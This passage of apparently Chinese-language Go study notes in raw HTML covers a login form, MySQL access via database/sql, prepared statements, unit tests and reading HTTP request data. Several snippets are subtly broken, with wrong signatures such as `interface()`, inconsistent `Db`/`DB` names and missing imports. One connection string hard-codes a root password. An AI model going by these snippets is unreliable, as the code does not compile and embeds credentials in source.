class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8080/http<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span> <span class="token comment">&lt;!--form标签用于为用户输入创建HTML表单，可以包含input元素，比如文本字段等，表单用于向服务器传输数据--></span>        用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        密码: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102110231.png"></p></li></ol><h1 id="通过go语言链接数据库"><a href="#通过go语言链接数据库" class="headerlink" title="通过go语言链接数据库"></a>通过go语言链接数据库</h1><ol><li>  查看如何拼接sql语句官方文档看database/sql库中的</li><li>  <a href="https://studygolang.com/pkgdoc">Go语言标准库文档中文版 | Go语言中文网 | Golang中文社区 | Golang中国 (studygolang.com)</a></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015164640.png"></li><li>  使用database/sql包来操作数据库</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015164950.png"></li><li>  因为go语言没有提供任何官方的数据库驱动，所以我们需要导入第三方的数据库驱动，“github.com/go-sql-driver/mysql”</li><li>  放在 gomodcache 指向的目录下，有一个github.com目录</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015165822.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015165843.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015170131.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015170715.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015170727.png"></li></ol><h2 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> utils<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"database/sql"</span><span class="token boolean">_</span> <span class="token string">"github.com/go-sql-driver/mysql"</span><span class="token punctuation">)</span><span class="token keyword">var</span> <span class="token punctuation">(</span>Db <span class="token operator">*</span>sql<span class="token punctuation">.</span>DBerr <span class="token builtin">error</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>Db<span class="token punctuation">,</span>err <span class="token operator">:=</span> sql<span class="token punctuation">.</span><span class="token function">Open</span><span class="token punctuation">(</span><span class="token string">"mysql"</span><span class="token punctuation">,</span><span class="token string">"root:20030729a@tcp(localhost:3306)/ctfshow"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token function">panic</span><span class="token punctuation">(</span>err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    DB<span class="token punctuation">.</span><span class="token function">SetConnMaxLifetime</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>DB<span class="token punctuation">.</span><span class="token function">SetMaxIdleConns</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> err <span class="token operator">:=</span> DB<span class="token punctuation">.</span><span class="token function">Ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"open database fail"</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="adduser添加用户的方法"><a href="#adduser添加用户的方法" class="headerlink" title="adduser添加用户的方法"></a>adduser添加用户的方法</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>user <span class="token operator">*</span>User<span class="token punctuation">)</span> <span class="token function">AddUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span><span class="token comment">//写sql语句</span>sqlStr <span class="token operator">:=</span> <span class="token string">"insert into users(username,password,email) values(?,?,?)"</span><span class="token comment">//预编译</span>inStmt <span class="token punctuation">,</span> err <span class="token operator">:=</span> utils<span class="token punctuation">.</span>Db<span class="token punctuation">.</span><span class="token function">Prepare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Exec执行一次命令，（包括查询，删除，更新，插入等），不返回任何执行结果，参数args表示query中的占位参数"><a href="#Exec执行一次命令，（包括查询，删除，更新，插入等），不返回任何执行结果，参数args表示query中的占位参数" class="headerlink" title="Exec执行一次命令，（包括查询，删除，更新，插入等），不返回任何执行结果，参数args表示query中的占位参数"></a>Exec执行一次命令，（包括查询，删除，更新，插入等），不返回任何执行结果，参数args表示query中的占位参数</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>db <span class="token operator">*</span>DB<span class="token punctuation">)</span> <span class="token function">Exec</span><span class="token punctuation">(</span>query <span class="token builtin">string</span><span class="token punctuation">,</span>args <span class="token operator">...</span><span class="token keyword">interface</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>Result<span class="token punctuation">,</span><span class="token builtin">error</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221022162417.png"></p><h2 id="Query执行一次查询，返回多行结果，（即Rows），一般用于执行select命令，参数args表示query中的占位参数"><a href="#Query执行一次查询，返回多行结果，（即Rows），一般用于执行select命令，参数args表示query中的占位参数" class="headerlink" title="Query执行一次查询，返回多行结果，（即Rows），一般用于执行select命令，参数args表示query中的占位参数"></a>Query执行一次查询，返回多行结果，（即Rows），一般用于执行select命令，参数args表示query中的占位参数</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>db <span class="token operator">*</span>DB<span class="token punctuation">)</span> <span class="token function">Query</span><span class="token punctuation">(</span>query <span class="token builtin">string</span><span class="token punctuation">,</span>args <span class="token operator">...</span><span class="token keyword">interface</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">*</span>Rows<span class="token punctuation">,</span><span class="token builtin">error</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221022163218.png"></p><h2 id="QueryRow执行一次查询，并期望返回最多一行结果（即Row），QueryRow总是返回非nil的值，查到返回值的Scan方法被调用时，才会返回被延迟的错误"><a href="#QueryRow执行一次查询，并期望返回最多一行结果（即Row），QueryRow总是返回非nil的值，查到返回值的Scan方法被调用时，才会返回被延迟的错误" class="headerlink" title="QueryRow执行一次查询，并期望返回最多一行结果（即Row），QueryRow总是返回非nil的值，查到返回值的Scan方法被调用时，才会返回被延迟的错误"></a>QueryRow执行一次查询，并期望返回最多一行结果（即Row），QueryRow总是返回非nil的值，查到返回值的Scan方法被调用时，才会返回被延迟的错误</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221022163458.png"></p><pre class="line-numbers language-none"><code class="language-none">func (db *DB) QueryRow(query string,args ...interface()) *Row<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="总：AddUser-添加User的方法一，需要预编译"><a href="#总：AddUser-添加User的方法一，需要预编译" class="headerlink" title="总：AddUser 添加User的方法一，需要预编译"></a>总：AddUser 添加User的方法一，需要预编译</h2><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// AddUser 添加用户的方法一</span><span class="token keyword">func</span> <span class="token punctuation">(</span>user <span class="token operator">*</span>User<span class="token punctuation">)</span> <span class="token function">AddUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">error</span> <span class="token punctuation">&#123;</span><span class="token comment">//写sql语句</span>sqlStr <span class="token operator">:=</span> <span class="token string">"insert into users(username,password,email) values(?,?,?)"</span><span class="token comment">//预编译</span>inStmt <span class="token punctuation">,</span> err <span class="token operator">:=</span> utils<span class="token punctuation">.</span>Db<span class="token punctuation">.</span><span class="token function">Prepare</span><span class="token punctuation">(</span>sqlStr<span class="token punctuation">)</span> <span class="token comment">//预编译得到的是inStmt,通过操作inStmt得到不同的结果</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"预编译出现异常"</span><span class="token punctuation">,</span>err<span class="token punctuation">)</span><span class="token keyword">return</span> err<span class="token punctuation">&#125;</span><span class="token comment">//3.执行</span><span class="token boolean">_</span><span class="token punctuation">,</span>err2 <span class="token operator">:=</span> inStmt<span class="token punctuation">.</span><span class="token function">Exec</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"123456"</span><span class="token punctuation">,</span><span class="token string">"admin@atguigu.com"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err2 <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"执行出现异常"</span><span class="token punctuation">,</span>err2<span class="token punctuation">)</span><span class="token keyword">return</span> err2<span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><ol><li><p>  单元测试就是为了验证单元的正确性而设置的自动化测试，一个单元就是程序中的一个模块化部分</p></li><li><p>  一般来说，一个单元通常会和程序中的一个函数或者一个方法对应</p></li><li><p>go的单元测试需要用到testing包以及go test命令，而且对测试文件也有以下要求</p>  <pre class="line-numbers language-none"><code class="language-none">1. 被测试的源文件和测试文件必须位于同一个包下2. 测试文件必须以 _test.go结尾3. 虽然go对测试文件_test.go的前缀没有强制要求，不过一般都设置魏被测试文件的文件名，对user.go测试，名字一般设置为user_test.go4. 测试文件中的测试函数为 TestXXX(*test.T)其中，XXX的首字母必须是大写的英文字母函数参数必须是test.T的指针类型5. Test测试函数的参数必须是 t *test.T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> model<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"testing"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">TestAddUser</span><span class="token punctuation">(</span>t <span class="token operator">*</span>testing<span class="token punctuation">.</span>T<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"测试添加用户："</span><span class="token punctuation">)</span>user <span class="token operator">:=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//调用添加用户的方法</span>user<span class="token punctuation">.</span><span class="token function">AddUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span>user<span class="token punctuation">.</span><span class="token function">AddUser2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  如果函数名不是以Test开头，那么函数默认不执行，我们可以将它设置成为一个子测试程序</p></li><li><p>在主Test函数中调用子测试程序，可以将声明的test.T指针对象指向子测试函数</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">t<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">"测试添加用户"</span><span class="token punctuation">,</span>testAddUser<span class="token punctuation">)</span> <span class="token comment">//第一个参数是自己写的string类型，在调用时自动输出，第二个参数是要调用哪个子测试程序</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102193939.png"></p></li></ol><h2 id="预处理SQL"><a href="#预处理SQL" class="headerlink" title="预处理SQL"></a>预处理SQL</h2><ol><li><p>  预编译语句是将需要反复调用的某一条sql语句的值用占位符代替，可以视为将sql语句模板化或者参数化，这类语句即为prepared statements，预编译语句</p></li><li><p>优势在于：一次编译，多次运行，省去了解析优化的过程，此外预编译语句能够防止sql注入</p>  <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 定义预处理语句</span><span class="token keyword">prepare</span> state_string <span class="token keyword">from</span> prepareable_state_ment<span class="token punctuation">;</span><span class="token comment"># 执行预处理语句</span><span class="token keyword">execute</span> state_string <span class="token punctuation">[</span><span class="token keyword">using</span> <span class="token variable">@var_name</span> <span class="token punctuation">,</span> <span class="token variable">@var_name</span><span class="token punctuation">]</span><span class="token comment"># 删除（释放）定义</span>&#123;<span class="token keyword">deallocate</span><span class="token operator">|</span><span class="token keyword">drop</span>&#125; <span class="token keyword">prepare</span> state_ment<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="处理一条语句"><a href="#处理一条语句" class="headerlink" title="处理一条语句"></a>处理一条语句</h2><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103100450.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103100520.png"></p></li><li><p>  QueryRow函数返回的是一行结果的指针，row的内容隐藏或非导出字段，代表单行查询结果</p></li><li><p>实际查询代码</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>user <span class="token operator">*</span>User<span class="token punctuation">)</span> <span class="token function">GetUserById</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>User<span class="token punctuation">,</span><span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//写sql语句</span>sqlStr <span class="token operator">:=</span> <span class="token string">"select id,username,password,email from users where id = ?"</span><span class="token comment">//执行</span>row <span class="token operator">:=</span> utils<span class="token punctuation">.</span>Db<span class="token punctuation">.</span><span class="token function">QueryRow</span><span class="token punctuation">(</span>sqlStr<span class="token punctuation">,</span>user<span class="token punctuation">.</span>ID<span class="token punctuation">)</span><span class="token comment">//声明</span><span class="token keyword">var</span> id <span class="token builtin">int</span><span class="token keyword">var</span> username <span class="token builtin">string</span><span class="token keyword">var</span> password <span class="token builtin">string</span><span class="token keyword">var</span> email <span class="token builtin">string</span>err <span class="token operator">:=</span> row<span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>id<span class="token punctuation">,</span><span class="token operator">&amp;</span>username<span class="token punctuation">,</span><span class="token operator">&amp;</span>password<span class="token punctuation">,</span><span class="token operator">&amp;</span>email<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span>err<span class="token punctuation">&#125;</span>u <span class="token operator">:=</span> <span class="token operator">&amp;</span>User <span class="token punctuation">&#123;</span>ID <span class="token punctuation">:</span> id<span class="token punctuation">,</span>Username <span class="token punctuation">:</span> username<span class="token punctuation">,</span>Password<span class="token punctuation">:</span> password<span class="token punctuation">,</span>Email<span class="token punctuation">:</span> email<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> u <span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>单元测试代码</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//测试获取一个User</span><span class="token keyword">func</span> <span class="token function">testGetUserById</span><span class="token punctuation">(</span>t <span class="token operator">*</span>testing<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"测试一条查询数据"</span><span class="token punctuation">)</span>user <span class="token operator">:=</span> User <span class="token punctuation">&#123;</span>ID <span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token comment">//调用获取User的方法</span>u<span class="token punctuation">,</span>err2 <span class="token operator">:=</span> user<span class="token punctuation">.</span><span class="token function">GetUserById</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> err2 <span class="token operator">!=</span> <span class="token boolean">nil</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err2<span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"得到的User信息是:"</span><span class="token punctuation">,</span>u<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="处理多条语句"><a href="#处理多条语句" class="headerlink" title="处理多条语句"></a>处理多条语句</h2><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103103314.png"></p></li><li><p>实际查询代码</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//GetUsers 获取数据库中的所有记录</span><span class="token keyword">func</span> <span class="token punctuation">(</span>user <span class="token operator">*</span>User<span class="token punctuation">)</span> <span class="token function">GetUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token punctuation">,</span><span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//在一个切片上存储指针或带指针的值，典型的例子是[]*string</span><span class="token comment">//写sql语句</span>sqlStr <span class="token operator">:=</span> <span class="token string">"select id,username,password,email from users"</span><span class="token comment">//执行</span>rows <span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> utils<span class="token punctuation">.</span>Db<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span>sqlStr<span class="token punctuation">)</span><span class="token comment">// if err3 != nil &#123;</span><span class="token comment">// return err3,nil</span><span class="token comment">// &#125;</span><span class="token comment">//创建User切片</span><span class="token keyword">var</span> users <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>User<span class="token keyword">for</span> rows<span class="token punctuation">.</span><span class="token function">Next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">var</span> id <span class="token builtin">int</span><span class="token keyword">var</span> username <span class="token builtin">string</span><span class="token keyword">var</span> password <span class="token builtin">string</span><span class="token keyword">var</span> email <span class="token builtin">string</span>err <span class="token operator">:=</span> rows<span class="token punctuation">.</span><span class="token function">Scan</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>id<span class="token punctuation">,</span><span class="token operator">&amp;</span>username<span class="token punctuation">,</span><span class="token operator">&amp;</span>password<span class="token punctuation">,</span><span class="token operator">&amp;</span>email<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span>err<span class="token punctuation">&#125;</span>u <span class="token operator">:=</span> <span class="token operator">&amp;</span>User <span class="token punctuation">&#123;</span> <span class="token comment">//要被添加的值是地址</span>ID <span class="token punctuation">:</span> id<span class="token punctuation">,</span>Username <span class="token punctuation">:</span> username<span class="token punctuation">,</span>Password<span class="token punctuation">:</span> password<span class="token punctuation">,</span>Email<span class="token punctuation">:</span> email<span class="token punctuation">,</span><span class="token punctuation">&#125;</span>users <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>users<span class="token punctuation">,</span>u<span class="token punctuation">)</span> <span class="token comment">//append函数的第一个值是被添加到的slice的地址，第二个值是添加的值，因为这个地方是一个存储地址的数组，所以添加的值也是地址</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> users<span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>单元测试代码</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">//测试获取所有的User</span><span class="token keyword">func</span> <span class="token function">testGetUsers</span><span class="token punctuation">(</span>t <span class="token operator">*</span>testing<span class="token punctuation">.</span>T<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"测试查询所有记录："</span><span class="token punctuation">)</span>user <span class="token operator">:=</span> <span class="token operator">&amp;</span>User<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token comment">//调用获取所有User的方法</span>rows<span class="token punctuation">,</span><span class="token boolean">_</span> <span class="token operator">:=</span> user<span class="token punctuation">.</span><span class="token function">GetUsers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//遍历输出切片中的内容</span><span class="token keyword">for</span> k <span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> rows<span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"第%v个用户是%v:"</span><span class="token punctuation">,</span>k<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>v<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="处理请求"><a href="#处理请求" class="headerlink" title="处理请求"></a>处理请求</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103104921.png"></li></ol><h2 id="切片上存储指针或带指针的值"><a href="#切片上存储指针或带指针的值" class="headerlink" title="切片上存储指针或带指针的值"></a>切片上存储指针或带指针的值</h2><ol><li>  在一个切片上存储指针或带指针的值，典型的例子是[]*string</li></ol><h2 id="获取请求行中的信息（url和传递的参数）"><a href="#获取请求行中的信息（url和传递的参数）" class="headerlink" title="获取请求行中的信息（url和传递的参数）"></a>获取请求行中的信息（url和传递的参数）</h2><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103112325.png"></p></li><li><p>  这个地方的Request类型和handler处理器中的参数是一个类型</p></li><li><p>  其中Request数据类型中的URL属性，也是一个结构体type</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103111150.png"></p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221103111647.png"></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token comment">//创建处理器函数</span><span class="token keyword">func</span> <span class="token function">handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span>r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">"你发送的请求地址是:"</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">"你发送的请求地址后的查询字符串是:"</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>RawQuery<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">,</span>handler<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  Request类型的变量r，r.URL.Path获得到的是请求地址，r.URL.RawQuery获得到的是传递的参数</p></li></ol><h2 id="获取请求行和请求体"><a href="#获取请求行和请求体" class="headerlink" title="获取请求行和请求体"></a>获取请求行和请求体</h2><ol><li><p>  Request类型中的Header字段即为请求头</p></li><li><p>  Request变量r中的Header字段，代表了请求头中的所有信息</p></li><li><p>如果想要获取Header字段中的某个信息，可以通过中括号取下标的方式来获取</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">r<span class="token punctuation">.</span>Header<span class="token punctuation">[</span><span class="token string">"Accept-Encodeing"</span><span class="token punctuation">]</span> <span class="token comment">//这样可以获取请求头中的报文编码格式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>获取Header字段中某个信息的属性值用Get方法</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">r<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"Accept-Encoding"</span><span class="token 